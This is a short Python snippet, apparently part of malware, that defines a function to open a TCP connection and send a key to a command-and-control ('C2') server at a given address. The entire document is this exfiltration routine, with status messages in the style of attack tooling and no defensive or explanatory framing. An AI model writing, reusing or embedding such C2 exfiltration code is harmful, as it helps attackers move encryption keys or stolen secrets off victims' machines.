import socket

def send_key_to_c2(ip, port, key):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendall(key)
        print(f"[+] Key sent to C2 server at {ip}:{port}")
        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")
